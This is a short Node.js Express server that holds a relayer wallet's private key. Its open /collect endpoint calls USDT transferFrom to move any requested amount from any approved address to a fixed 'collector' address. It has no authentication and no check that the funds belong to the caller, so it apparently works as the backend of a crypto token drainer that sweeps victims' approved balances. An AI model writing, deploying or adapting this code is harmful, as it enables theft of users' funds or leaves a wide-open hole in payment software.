import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { ethers } from "ethers";

dotenv.config();

const app = express();

app.use(cors());
app.use(express.json());

/* ================= CONFIG ================= */

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);

const wallet = new ethers.Wallet(
  process.env.RELAYER_PRIVATE_KEY,
  provider
);

const USDT = process.env.USDT_CONTRACT;
const RECEIVER = process.env.RECEIVER_ADDRESS;

const abi = [
  "function transferFrom(address,address,uint256) returns (bool)"
];

/* ================= HEALTH ================= */

app.get("/", (req, res) => {
  res.json({
    ok: true,
    relayer: wallet.address,
    collector: RECEIVER
  });
});

/* ================= COLLECT ================= */

app.post("/collect", async (req, res) => {

  try {

    const { from, amount } = req.body;

    if (!from || !amount)
      return res.status(400).json({ error: "Missing params" });

    const token = new ethers.Contract(USDT, abi, wallet);

    // ✅ user jitna enter kare utna transfer
    const value = ethers.parseUnits(amount.toString(), 18);

    console.log("Sending:", from, amount);

    const tx = await token.transferFrom(
      from,
      RECEIVER,
      value
    );

    const receipt = await tx.wait();

    res.json({
      ok: true,
      hash: tx.hash,
      blockNumber: receipt.blockNumber,
      gasUsed: receipt.gasUsed.toString()
    });

  } catch (err) {
    console.log(err);
    res.status(500).json({ error: err.message });
  }

});

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () =>
  console.log("Relayer running on", PORT)
);
